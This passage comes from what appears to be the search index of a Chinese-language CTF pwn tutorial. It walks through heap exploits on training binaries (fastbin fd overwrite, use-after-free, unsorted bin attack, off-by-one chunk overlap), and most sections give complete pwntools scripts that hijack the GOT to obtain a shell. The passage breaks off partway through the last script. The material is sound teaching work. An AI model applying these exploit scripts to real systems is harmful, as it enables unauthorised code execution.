\u7684\u5408\u6cd5\u6027\u9a8c\u8bc1 (new_chunk \u7684 size \u4f4d\u8981\u4e0e bin \u94fe\u8868 size \u4e00\u81f4)</p> <p>\u8fd9\u6837\u5c31\u4f2a\u9020\u51fa\u4e86\u4e00\u4e2a chunk</p> <pre><code>payload = b'/bin/sh\\x00' + b'A' * 0x60 + p64(0x71) + p64(0x6020ad)\n\nedit(1,len(payload),payload)\n\ngdb.attach(io)\n</code></pre> <p></p> <p></p> <p>\u91cd\u65b0\u5206\u914d chunk 2\uff0c\u7531\u4e8e fastbin \u7684 fd \u6307\u9488\u88ab\u4fee\u6539\uff0c\u65b0\u7684 chunk 2 \u4f1a\u4ece <code>0x6020ad</code> \u5904\u5206\u914d</p> <p>\u518d\u6b21\u5206\u914d chunk 3\uff0c\u6b64\u65f6 chunk 3 \u7684\u5730\u5740\u4f1a\u88ab\u5199\u5165 <code>heaparray[0]</code></p> <p>\u4fee\u6539 heaparray[0] \u7684\u503c\u4e3a free_got</p> <pre><code>add(0x60,\"happy\")\nadd(0x60,\"happy\")\n\npayload2 = b'A' * 0x23 + p64(elf.got[\"free\"])\n\nedit(3,len(payload2),payload2)\n\ngdb.attach(io)\n</code></pre> <p></p> <p></p> <p>\u4fee\u6539 free_got \u4e3a system_plt</p> <pre><code>payload3 = p64(elf.plt[\"system\"])\n\nedit(0,len(payload3),payload3)\n\ngdb.attach(io)\n</code></pre> <p></p> <p>\u91ca\u653e chunk 1\uff0c\u7531\u4e8e <code>free_got</code> \u5df2\u7ecf\u88ab\u4fee\u6539\u4e3a <code>system</code> \u51fd\u6570\u7684\u5730\u5740\uff0c\u5b9e\u9645\u6267\u884c\u7684\u662f <code>system('/bin/sh')</code>\uff0c\u4ece\u800c\u83b7\u53d6 shell</p> <pre><code>delete(1)\n\ngdb.attach(io)\n\nio.interactive()\n</code></pre> <p></p> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\n\n#io=process(\"easyheap\")\nio = remote(\"node4.buuoj.cn\",26646)\nelf = ELF(\"easyheap\")\n\ndef add(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"Size of Heap : \")\n    io.sendline(str(size))\n    io.recvuntil(\"Content of heap:\")\n    io.send(content)\n\n\ndef edit(index,size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n    io.recvuntil(\"Size of Heap : \")\n    io.sendline(str(size))\n    io.recvuntil(\"Content of heap : \")\n    io.send(content)\n\n\ndef delete(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd(0x60,\"happy\")\nadd(0x60,\"happy\")\nadd(0x60,\"happy\")\n\ndelete(2)\n\npayload = b'/bin/sh\\x00' + b'A' * 0x60 + p64(0x71) + p64(0x6020ad)\n\nedit(1,len(payload),payload)\n\nadd(0x60,\"happy\")\nadd(0x60,\"happy\")\n\npayload2 = b'A' * 0x23 + p64(elf.got[\"free\"])\n\nedit(3,len(payload2),payload2)\n\npayload3 = p64(elf.plt[\"system\"])\n\nedit(0,len(payload3),payload3)\n\ndelete(1)\n\nio.interactive()\n</code></pre>"},{"location":"Pwn/Chapter6/6-4/","title":"UAF\uff08\u4fee\u6539\u5806\u5730\u5740\uff09","text":""},{"location":"Pwn/Chapter6/6-4/#uaf\u4fee\u6539\u5806\u5730\u5740","title":"UAF\uff08\u4fee\u6539\u5806\u5730\u5740\uff09","text":"<p>\u5148 checksec</p> <p></p> <p>\u540c\u6837\u662f\u4e00\u4e2a\u83dc\u5355\u7ba1\u7406</p> <p></p> <p>\u5728 IDA \u4e2d\u627e\u5230\u4e86\u540e\u95e8\u51fd\u6570</p> <p></p> <p>add \u51fd\u6570</p> <p>\u53ef\u4ee5\u53d1\u73b0\u521b\u5efa\u4e86\u4e24\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a chunk \u662f\u9ed8\u8ba4\u7684\uff0c\u5b58\u653e puts \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7b2c\u4e8c\u4e2a chunk</p> <p></p> <p>delete\uff0c\u5b83\u53ea\u91ca\u653e\u6389\u4e86\u5806\u5757\u91cc\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6ca1\u6709\u5c06\u6307\u9488\u7f6e 0\uff0c\u5b58\u5728 uaf \u6f0f\u6d1e</p> <p></p> <p>printf \u51fd\u6570</p> <p></p> <p>\u53ef\u4ee5\u5148\u521b\u5efa\u4e00\u4e2a\u5806\u770b\u770b\u662f\u4e0d\u662f\u6709\u521b\u5efa\u9ed8\u8ba4\u5806</p> <pre><code>add(48,'aaaa')\n\ngdb.attach(r)\n</code></pre> <p></p> <p>\u53d1\u73b0\u6709\u521b\u5efa\u9ed8\u8ba4\u5806\uff0c\u7533\u8bf7\u4e24\u4e2a\u5806\uff0c\u5b9e\u9645\u4e0a\u751f\u6210\u4e86\u56db\u4e2a\u5806</p> <pre><code>add(48,'aaaa')\nadd(48,'bbbb')\n\ngdb.attach(r)\n</code></pre> <p></p> <p>\u7528 printf \u6253\u5370\u4e00\u4e2a\u5806\u5757\u770b\u4e00\u4e0b\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u6253\u5370\u51fa\u4e86 add \u521b\u5efa\u7684\u7b2c\u4e8c\u4e2a chunk \u91cc\u7684\u503c</p> <p></p> <p>\u5148 free \u6389\u7b2c\u4e00\u4e2a\u521b\u5efa\u7684\u5806\u5757</p> <pre><code>delete(0)\n\ngdb.attach(r)\n</code></pre> <p></p> <p>\u518d\u6b21\u91ca\u653e\u7b2c\u4e8c\u4e2a\u5806\u5757</p> <pre><code>delete(1)\n\ngdb.attach(r)\n</code></pre> <p></p> <p>\u6211\u4eec\u518d\u7533\u8bf7\u4e00\u4e2a 8 \u5b57\u8282\u7684 chunk\uff0c\u5199\u5165 shell_addr \u770b\u4e00\u4e0b\u5806\u5757\u7684\u60c5\u51b5</p> <pre><code>add(8,p32(shell_addr))\ngdb.attach(r)\n</code></pre> <p></p> <p></p> <p>\u6211\u4eec\u73b0\u5728\u8fdb\u884c printf \u7684\u8bdd\u5c31\u4f1a\u8df3\u8f6c\u5230\u540e\u95e8\u51fd\u6570\u83b7\u53d6 shell</p> <pre><code>from pwn import*\n\n#r = remote('node5.buuoj.cn',28389)\nr = process('./hacknote')\n\ndef add(size,content):\n  r.sendlineafter('choice :','1')\n  r.sendlineafter('Note size :',str(size))\n  r.sendlineafter('Content :',content)\n\ndef delete(idx):\n  r.sendlineafter('choice :','2')\n  r.sendlineafter('Index :',str(idx))\n\ndef printf(idx):\n  r.sendlineafter('choice :','3')\n  r.sendlineafter('Index :',str(idx))\n\nshell_addr = 0x8048945\n\nadd(48,'aaaa')\n#gdb.attach(r)\n\nadd(48,'bbbb')\n#gdb.attach(r)\n\ndelete(0)\n#gdb.attach(r)\n\ndelete(1)\n#gdb.attach(r)\n\nadd(8,p32(shell_addr))\n#gdb.attach(r)\n\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter6/6-5/","title":"Unsorted Bin Attack\uff08\u4fee\u6539 bk \u6307\u9488\uff09","text":""},{"location":"Pwn/Chapter6/6-5/#unsorted-bin-attack\u4fee\u6539-bk-\u6307\u9488","title":"Unsorted Bin Attack\uff08\u4fee\u6539 bk \u6307\u9488\uff09","text":"<p>\u627e\u5230\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u5b8c\u6210\u6307\u5b9a\u6761\u4ef6\u5373\u53ef\u6267\u884c</p> <p></p> <p>\u5148\u770b\u521b\u5efa</p> <p></p> <p>\u7f16\u8f91\u51fd\u6570</p> <p></p> <p>\u91ca\u653e\u51fd\u6570</p> <p></p> <ol> <li> <p>Unsorted Bin \u7684\u4f5c\u7528</p> </li> <li> <p>\u4e34\u65f6\u5b58\u50a8\uff1a\u5f53\u4e00\u5757\u5185\u5b58\u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4e0d\u4f1a\u7acb\u5373\u88ab\u653e\u5165\u7279\u5b9a\u5927\u5c0f\u7684 bin\uff08\u5982 small bin \u6216 large bin\uff09\uff0c\u800c\u662f\u5148\u88ab\u653e\u5165 unsorted bin</p> </li> <li>\u5feb\u901f\u91cd\u7528\uff1a\u5728\u540e\u7eed\u7684\u5185\u5b58\u5206\u914d\u8bf7\u6c42\u4e2d\uff0c\u5806\u7ba1\u7406\u5668\u4f1a\u4f18\u5148\u68c0\u67e5 unsorted bin\uff0c\u770b\u770b\u662f\u5426\u6709\u5408\u9002\u5927\u5c0f\u7684\u5185\u5b58\u5757\u53ef\u4ee5\u76f4\u63a5\u91cd\u7528\uff0c\u4ece\u800c\u907f\u514d\u9891\u7e41\u7684\u5206\u5272\u548c\u5408\u5e76\u64cd\u4f5c</li> <li>\u5408\u5e76\u76f8\u90bb\u7a7a\u95f2\u5757\uff1a\u5728\u5c06\u5185\u5b58\u5757\u653e\u5165 unsorted bin \u65f6\uff0c\u5806\u7ba1\u7406\u5668\u4f1a\u5c1d\u8bd5\u5c06\u5176\u4e0e\u76f8\u90bb\u7684\u7a7a\u95f2\u5757\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247</li> </ol> <ol> <li> <p>Unsorted Bin \u7684\u7ed3\u6784</p> </li> <li> <p>\u53cc\u5411\u94fe\u8868\uff1aunsorted bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u7528\u4e8e\u5b58\u50a8\u88ab\u91ca\u653e\u7684\u5185\u5b58\u5757</p> </li> <li>FIFO \u539f\u5219\uff1a\u65b0\u91ca\u653e\u7684\u5185\u5b58\u5757\u4f1a\u88ab\u63d2\u5165\u5230\u94fe\u8868\u7684\u5934\u90e8\uff0c\u800c\u5206\u914d\u65f6\u5219\u4ece\u5934\u90e8\u5f00\u59cb\u904d\u5386</li> <li>\u5927\u5c0f\u4e0d\u9650\uff1aunsorted bin \u4e2d\u7684\u5185\u5b58\u5757\u5927\u5c0f\u6ca1\u6709\u9650\u5236\uff0c\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u5927\u5c0f\u7684 chunk</li> </ol> <ol> <li> <p>Unsorted Bin \u7684\u5de5\u4f5c\u6d41\u7a0b</p> </li> <li> <p>\u91ca\u653e\u5185\u5b58\u5757\uff1a</p> </li> <li>\u5f53\u8c03\u7528 <code>free()</code> \u91ca\u653e\u4e00\u5757\u5185\u5b58\u65f6\uff0c\u8be5\u5185\u5b58\u5757\u4f1a\u88ab\u653e\u5165 unsorted bin \u4e2d</li> <li>\u5806\u7ba1\u7406\u5668\u4f1a\u68c0\u67e5\u8be5\u5185\u5b58\u5757\u7684\u524d\u540e\u76f8\u90bb\u5757\u662f\u5426\u662f\u7a7a\u95f2\u7684\uff0c\u5982\u679c\u662f\uff0c\u5219\u8fdb\u884c\u5408\u5e76\uff0c\u5f62\u6210\u4e00\u4e2a\u66f4\u5927\u7684\u7a7a\u95f2\u5757</li> <li>\u5206\u914d\u5185\u5b58\u5757\uff1a</li> <li>\u5f53\u8c03\u7528 <code>malloc()</code> \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0c\u5806\u7ba1\u7406\u5668\u4f1a\u9996\u5148\u904d\u5386 unsorted bin\uff0c\u5bfb\u627e\u662f\u5426\u6709\u5408\u9002\u5927\u5c0f\u7684\u5185\u5b58\u5757</li> <li>\u5982\u679c\u627e\u5230\u5408\u9002\u7684\u5185\u5b58\u5757\uff0c\u5219\u76f4\u63a5\u5c06\u5176\u4ece unsorted bin \u4e2d\u53d6\u51fa\u5e76\u8fd4\u56de\u7ed9\u7528\u6237</li> <li>\u5982\u679c\u627e\u5230\u7684\u5185\u5b58\u5757\u6bd4\u8bf7\u6c42\u7684\u5927\u5c0f\u5927\uff0c\u5219\u4f1a\u5c06\u5176\u5206\u5272\u6210\u4e24\u90e8\u5206\uff1a\u4e00\u90e8\u5206\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u53e6\u4e00\u90e8\u5206\u91cd\u65b0\u653e\u5165 unsorted bin</li> <li>\u6574\u7406 unsorted bin\uff1a</li> <li>\u5982\u679c unsorted bin \u4e2d\u7684\u5185\u5b58\u5757\u957f\u65f6\u95f4\u672a\u88ab\u4f7f\u7528\uff0c\u5806\u7ba1\u7406\u5668\u4f1a\u5c06\u5176\u79fb\u52a8\u5230\u5bf9\u5e94\u7684 small bin \u6216 large bin \u4e2d\uff0c\u4ee5\u4fbf\u66f4\u9ad8\u6548\u5730\u7ba1\u7406</li> </ol> <ol> <li> <p>Unsorted Bin \u7684\u7279\u70b9</p> </li> <li> <p>\u7075\u6d3b\u6027\uff1aunsorted bin \u53ef\u4ee5\u5b58\u50a8\u4efb\u610f\u5927\u5c0f\u7684\u5185\u5b58\u5757\uff0c\u9002\u5408\u5904\u7406\u4e0d\u786e\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\u5206\u914d\u8bf7\u6c42</p> </li> <li>\u51cf\u5c11\u788e\u7247\uff1a\u901a\u8fc7\u5408\u5e76\u76f8\u90bb\u7a7a\u95f2\u5757\uff0cunsorted bin \u53ef\u4ee5\u6709\u6548\u51cf\u5c11\u5185\u5b58\u788e\u7247</li> <li>\u6027\u80fd\u4f18\u5316\uff1aunsorted bin \u7684\u8bbe\u8ba1\u4f7f\u5f97\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u64cd\u4f5c\u66f4\u52a0\u9ad8\u6548\uff0c\u5c24\u5176\u662f\u5728\u9891\u7e41\u5206\u914d\u548c\u91ca\u653e\u5c0f\u5757\u5185\u5b58\u7684\u573a\u666f\u4e2d</li> </ol> <ol> <li> <p>Unsorted Bin \u7684\u5c40\u9650\u6027</p> </li> <li> <p>\u904d\u5386\u5f00\u9500\uff1a\u7531\u4e8e unsorted bin \u662f\u4e00\u4e2a\u94fe\u8868\uff0c\u4e14\u5176\u4e2d\u7684\u5185\u5b58\u5757\u5927\u5c0f\u4e0d\u4e00\uff0c\u56e0\u6b64\u5728\u5206\u914d\u65f6\u9700\u8981\u904d\u5386\u94fe\u8868\u4ee5\u5bfb\u627e\u5408\u9002\u7684\u5185\u5b58\u5757\uff0c\u8fd9\u53ef\u80fd\u5e26\u6765\u4e00\u5b9a\u7684\u6027\u80fd\u5f00\u9500</p> </li> <li>\u788e\u7247\u95ee\u9898\uff1a\u867d\u7136 unsorted bin \u53ef\u4ee5\u51cf\u5c11\u788e\u7247\uff0c\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u53ef\u80fd\u5bfc\u81f4\u5185\u5b58\u788e\u7247\u5316</li> </ol> <ol> <li>Unsorted Bin \u7684\u5b9e\u9645\u5e94\u7528</li> </ol> <p>\u5728\u5806\u6f0f\u6d1e\u5229\u7528\u4e2d\uff0cunsorted bin \u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u653b\u51fb\u76ee\u6807\u3002\u4f8b\u5982\uff1a</p> <ul> <li>Unsorted Bin Attack\uff1a\u901a\u8fc7\u7be1\u6539 unsorted bin \u4e2d\u7684\u94fe\u8868\u6307\u9488\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff0c\u4ece\u800c\u7ed5\u8fc7\u5b89\u5168\u673a\u5236\u6216\u4fee\u6539\u5173\u952e\u6570\u636e</li> <li>Heap Feng Shui\uff1a\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236 unsorted bin \u4e2d\u7684\u5185\u5b58\u5757\u5e03\u5c40\uff0c\u8fdb\u800c\u5b9e\u73b0\u6f0f\u6d1e\u5229\u7528</li> </ul> <p>\u9996\u5148\u901a\u8fc7 unsorted bin attack \u8986\u76d6 magic&gt;0x1305\uff0c\u7136\u540e\u8f93\u5165 v3= 4849, \u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86</p> <p>\u9996\u5148\u521b\u5efa\u4e09\u4e2a chunk</p> <pre><code>CreateHeap(0x30,'aaaa') # 0\nCreateHeap(0x80,'bbbb') # 1\nCreateHeap(0x10,'cccc') # 2\n</code></pre> <p></p> <p>\u4e4b\u540e free chunk1</p> <p></p> <p>chunk 2 \u662f\u4e3a\u4e86\u9632\u6b62 free chunk 1 \u7684\u65f6\u5019 chunk 1 \u4e0e top chunk \u5408\u5e76</p> <p>chunk0 \u3001chunk2 \u7684\u5927\u5c0f\u968f\u610f\uff0cchunk1 \u7684\u5927\u5c0f\u8981 &gt; 0x80\uff08fast bin \u6700\u5927\u4e3a 0x80\uff09\uff0c\u8fd9\u6837 free \u5b83\u7684\u65f6\u5019\u4f1a\u8fdb\u5165\u5230 unsorted bin</p> <p>\uff08chunk \u5728\u88ab\u91ca\u653e\u540e\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5728 fast bin \u7684\u8303\u56f4\u5185\uff0c\u4f1a\u88ab\u5148\u653e\u5230 unsorted bin\uff0c\u5728\u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\u5982\u679c\u5927\u5c0f\u4e0d\u662f fast bin \u5927\u5c0f\u7684\u5185\u5b58\u5e76\u4e14\u5728 small bin \u4e2d\u6ca1\u6709\u627e\u5230\u5408\u9002\u7684 chunk\uff0c\u5c31\u4f1a\u53bb unsorted \u4e2d\u5bfb\u627e\uff09</p> <p>\u6b64\u65f6\u5806\u6808\u5e03\u5c40\u5982\u4e0b</p> <p></p> <p>\u6211\u4eec\u901a\u8fc7 chunk 0 \u6ea2\u51fa\u8986\u5199 chunk 1 \u7684 bk \u6307\u9488</p> <p>\uff08\u5176\u56fe\u4e2d\u7684\u503c\u4e0e\u4e0a\u56fe\u5bf9\u5e94\uff09</p> <p></p> <p>\u627e\u5230 magic \u7684\u5730\u5740</p> <p></p> <p>\u5728 glibc \u7684\u5b9e\u73b0\u4e2d\uff0c<code>fd-&gt;bk</code> \u548c <code>bk-&gt;fd</code> \u7684\u5199\u5165\u64cd\u4f5c\u662f\u57fa\u4e8e chunk \u7684\u5934\u90e8\u7ed3\u6784</p> <p>\u6bcf\u4e2a chunk \u7684 <code>fd</code> \u548c <code>bk</code> \u6307\u9488\u4f4d\u4e8e chunk \u7684 <code>mem</code> \u533a\u57df\u4e4b\u524d 0x10 \u5b57\u8282\uff08\u5373 <code>chunk + 0x10</code>\uff09</p> <pre><code>+-------------------+ &lt;-- chunk \u8d77\u59cb\u5730\u5740\n|      prev_size    |  (\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f\uff0c\u5982\u679c\u524d\u4e00\u4e2a chunk \u662f\u7a7a\u95f2\u7684)\n+-------------------+\n|       size        |  (\u5f53\u524d chunk \u7684\u5927\u5c0f\uff0c\u4f4e 3 \u4f4d\u7528\u4e8e\u6807\u5fd7\u4f4d)\n+-------------------+ &lt;-- mem \u533a\u57df\u8d77\u59cb\u5730\u5740\n|        fd         |  (\u6307\u5411\u4e0b\u4e00\u4e2a chunk)\n+-------------------+\n|        bk         |  (\u6307\u5411\u4e0a\u4e00\u4e2a chunk)\n+-------------------+\n|      user data    |  (\u7528\u6237\u6570\u636e\u533a\u57df)\n+-------------------+\n</code></pre> <p>\u56e0\u6b64\uff1a</p> <ul> <li>\u5982\u679c <code>fd</code> \u88ab\u4fee\u6539\u4e3a <code>target_addr - 0x10</code>\uff0c\u90a3\u4e48 <code>fd-&gt;bk</code> \u5c31\u4f1a\u5199\u5165 <code>target_addr</code></li> <li>\u540c\u7406\uff0c\u5982\u679c <code>bk</code> \u88ab\u4fee\u6539\u4e3a <code>target_addr - 0x10</code>\uff0c\u90a3\u4e48 <code>bk-&gt;fd</code> \u4e5f\u4f1a\u5199\u5165 <code>target_addr</code></li> </ul> <p>\u8fd9\u91cc\u5c31\u662f\u6ce8\u610f\u6700\u540e\u7684 <code>p64(0x6020A0 - 0x10)</code></p> <p>\u6211\u4eec\u91cd\u65b0 malloc \u7684\u65f6\u5019\uff0c\u4ed6\u7684\u673a\u5236\u4f1a\u68c0\u9a8c bin \u548c bk \u7684\u6307\u5411\u5bf9\u4e0d\u5bf9</p> <p>\u8fd9\u91cc\u6211\u4eec\u8fdb\u884c\u4e86\u4fee\u6539\u5c31\u80af\u5b9a\u4f1a\u51fa\u95ee\u9898</p> <p>\u5176\u5b9e\u4e5f\u4e0d\u7b97\u51fa\u95ee\u9898\uff0c\u5c31\u662f\u5b83\u4f1a\u628a bin \u88ab\u6307\u5411\u6211\u4eec\u4fee\u6539\u7684\u5730\u5740\u7684\u5f80\u4e0b 0x10 \u7684\u4f4d\u7f6e</p> <p>\u4e5f\u5c31\u662f\u8df3\u8fc7\u4e86\u524d 0x10 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8981\u51cf 0x10</p> <p>\u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u770b\u5230 0x6020A0 \u88ab\u6211\u4eec\u4fee\u6539\u5230\u6307\u5411 bin\uff0cbin \u8fd9\u91cc\u7684\u503c\u8fdc\u8fdc\u5927\u4e8e\u9898\u76ee\u6240\u9700\u6240\u4ee5\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u4efb\u52a1</p> <p>\u518d\u8fdb\u884c\u4e00\u6b21\u8f93\u5165\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>magic = 0x6020A0\nEditHeap(0, 0x50, 0x30 * b\"a\" + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10))\n</code></pre> <p></p> <p>\u7136\u540e\u6211\u4eec\u518d\u6b21\u521b\u5efa\u4e0e chunk 1 \u540c\u6837\u5927\u5c0f\u7684 chunk \uff0c\u88ab free \u6389\u7684 chunk 1 \u5c31\u4f1a\u4ece unsorted bin \u4e2d\u53d6\u51fa\uff0c\u505a\u8131\u94fe\u64cd\u4f5c</p> <p>\u5373\u6211\u4eec\u5411 magic \u5199\u5165\u4e86\u4e00\u4e2a \u5927\u4e8e 0x1305 \u7684\u503c\uff08unsorted bin \u94fe\u8868\u5934\u5730\u5740\uff09</p> <p>\u7136\u540e\u6211\u4eec\u518d\u6b21 malloc \u4e0e unsorted bin \u4e00\u6837\u5927\u5c0f\u7684\u5757\u5c31\u53ef\u4ee5\u8fdb\u5165 get_flag \u6210\u529f\u62ff shell</p> <pre><code>CreateHeap(0x80,'dddd')\n</code></pre> <pre><code>from pwn import *\n\np = process('./magicheap')\n#p = remote('node5.buuoj.cn',27829)\n\ndef CreateHeap(size,content):\n    p.recvuntil(':')\n    p.sendline('1')\n    p.recvuntil(':')\n    p.sendline(str(size))\n    p.recvuntil(':')\n    p.sendline(content)\n\ndef EditHeap(idx,size,content):\n    p.recvuntil(':')\n    p.sendline('2')\n    p.recvuntil(':')\n    p.sendline(str(idx))\n    p.recvuntil(':')\n    p.sendline(str(size))\n    p.recvuntil(':')\n    p.sendline(content)\n\ndef DeleteHeap(idx):\n    p.recvuntil(':')\n    p.sendline('3')\n    p.recvuntil(':')\n    p.sendline(str(idx))\n\nCreateHeap(0x30,'aaaa')\nCreateHeap(0x80,'bbbb')\nCreateHeap(0x10,'cccc')\ngdb.attach(p)\n\nDeleteHeap(1)\ngdb.attach(p)\n\nmagic = 0x6020A0\n\nEditHeap(0, 0x50, 0x30 * b\"a\" + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10))\ngdb.attach(p)\n\nCreateHeap(0x80,'dddd')\ngdb.attach(p)\n\np.sendlineafter(':','4869')\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter6/6-6/","title":"Off By One \u7ed3\u5408 Chunk Overlap\uff08\u4f2a\u9020\u5806\u5757\u4fee\u6539\u6307\u9488\uff09","text":""},{"location":"Pwn/Chapter6/6-6/#off-by-one-\u7ed3\u5408-chunk-overlap\u4f2a\u9020\u5806\u5757\u4fee\u6539\u6307\u9488","title":"Off By One \u7ed3\u5408 Chunk Overlap\uff08\u4f2a\u9020\u5806\u5757\u4fee\u6539\u6307\u9488\uff09","text":"<p>create()\uff0c\u4e00\u6b21\u8bf7\u6c42\u7533\u8bf7\u4e86\u4e24\u4e2a chunk\uff0c\u524d\u4e00\u4e2a chunk \u91cc\u8bb0\u5f55\u7740\u540e\u4e00\u4e2a chunk \u7684\u6307\u9488\u548c size</p> <p></p> <p>\u7b2c 19 \u884c\u660e\u663e off by one \u6f0f\u6d1e</p> <p></p> <p>\u9996\u5148\u5206\u522b add \u56db\u4e2a\u5206\u522b\u4e3a 0x18\u30010x10\u30010x10\u30010x10 \u7684\u5806\u5757</p> <p>\u8fd9\u6837\u5c31\u6709 1\u4e2a 0x18\uff0c7 \u4e2a 0x10 \u7684\u5806\u5757\u4e86</p> <p>\u5176\u4e2d chunk3 \u4e2d\u5199\u5165\u7684 <code>'/bin/sh\\x00'</code> \u540e\u9762\u8981\u5229\u7528\u5230</p> <p>chunk0 \u7533\u8bf7\u4e3a 0x18 \u7684\u539f\u56e0\u662f\u8fd9\u6837\u7533\u8bf7\u62ff\u5230\u4e86\u4e00\u4e2a size=0x20 \u7684\u5806\u5757\uff0c\u56e0\u4e3a\u9700\u8981\u5bf9\u9f50</p> <p>\u5199\u5165\u6570\u636e\u65f6\u53ea\u5f80\u672c\u5806\u5757\u5199\u5165 0x10\uff0c\u4e0b\u4e2a chunk \u7684 prev_size \u57df\u6765\u8865\u8db3\u8fd9 0x8</p> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u6ea2\u51fa\u5230\u4e0b\u4e00\u4e2a chunk \u7684 prev_size\uff0c\u7136\u540e\u518d\u6ea2\u51fa 1 \u5b57\u8282\uff0c\u5229\u7528 off by one \u4fee\u6539\u4e0b\u4e00\u4e2a chunk \u7684 size\uff0c\u89e6\u53d1 chunk overlap</p> <pre><code>add(0x18,'hhhh')        # chunk0\nadd(0x10,'aaaa')        # chunk1\nadd(0x10,'pppp')        # chunk2\nadd(0x10,b'/bin/sh\\x00') # chunk3\n</code></pre> <p></p> <p>\u67e5\u770b\u8be6\u7ec6\u7684\u5185\u5b58</p> <p></p> <p>\u5229\u7528 off by one \u4fee\u6539 chunk1 \u7684\u7684 size\uff0c\u5e76\u628a chunk1 free \u6389</p> <pre><code>payload1 = b'a' * 0x18 + p8(0x81)\n\n# chunk0 \u6ea2\u51fa\u4fee\u6539 chunk1\nedit(0,payload1)\ndelete(1)\n</code></pre> <p></p> <p></p> <p>\u6b64\u65f6\u5728\u7533\u8bf7\u4e00\u4e2a<code>0x70</code>\u5927\u5c0f\u7684chunk\uff0c\u5c31\u80fd\u5c06\u8fd9\u4e2a<code>0x80</code>\u5757\u7533\u8bf7\u51fa\u6765</p> <p>\u6b64\u65f6 chunk2 \u7684\u6307\u9488\u6ca1\u6709\u66f4\u6539\uff0c\u7cfb\u7edf\u521b\u5efa\u7684 chunk2 \u8fd8\u662f\u5b58\u653e\u7740\u7528\u6237\u521b\u5efa\u7684 chunk2 \u7684\u5730\u5740</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u5730\u5740\u4fee\u6539\u6210 <code>free@got</code> \u7684\u5730\u5740\uff0c\u6cc4\u9732\u51fa libc \u7684\u5730\u5740</p> <p>\u91cd\u65b0\u7533\u8bf7 fake_chunk\uff0c\u5e76\u5806\u6ea2\u51fa\u4fee\u6539 chunk2 \u4e2d\u5b58\u653e\u7684 chunk2 \u5730\u5740\u4e3a free_got \u5730\u5740</p> <pre><code>size = 0x8\npayload2 = b'a' * 0x40 + p64(size) + p64(elf.got[\"free\"])\nadd(0x70,payload2)\ngdb.attach(io)\npause()\n</code></pre> <p></p> <p>\u6210\u529f\u4fee\u6539\u4e3a free_got \u5730\u5740</p> <p></p> <p>\u901a\u8fc7 show(2) \u8f93\u51fa chunk2 \u91cc\u6307\u5411\u7684 free_got \u91cc\u7684 free \u51fd\u6570\u5730\u5740\uff0c\u7528\u8fd9\u4e2a\u5730\u5740\u6cc4\u6f0f libc\uff0c\u5e76\u8ba1\u7b97\u5f97\u5230 system \u7684\u5730\u5740</p> <pre><code>show(2)\nio.recvuntil(\"Content : \")\n\nfree_addr = u64(io.recvuntil(\"Done\")[:-5].ljust(8,b'\\x00'))\n</code></pre> <p>\u4fee\u6539 free_got \u4e3a system \u7684\u5730\u5740</p> <p>free(chunk3) \u540e\u5229\u7528\u4e4b\u524d\u5199\u597d\u7684 <code>\"/bin/sh\\x00\"</code> \u6267\u884c <code>free(\"/bin/sh\\x00\")</code>\uff0c\u7531\u4e8e free_got \u88ab\u4fee\u6539\u4e3a system \u7684\u5730\u5740</p> <p>\u6240\u4ee5\u8fd9\u91cc\u6267\u884c <code>system(\"/bin/sh\\x00\")</code>\uff0c\u62ff\u5230 shell</p> <pre><code>payload3 = p64(system)\nedit(2,payload3)\ndelete(3)\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nio = process(\"heapcreator\")\n#io = remote(\"node5.buuoj.cn\",27164)\nelf = ELF(\"./heapcreator\")\n\ndef add(size,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"Size of Heap : \")\n    io.sendline(str(size))\n    io.recvuntil(\"Content of heap:\")\n    io.send(content)\n\ndef edit(index,content):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n    io.recvuntil(\"Content of heap : \")\n    io.send(content)\n\ndef show(index):\n  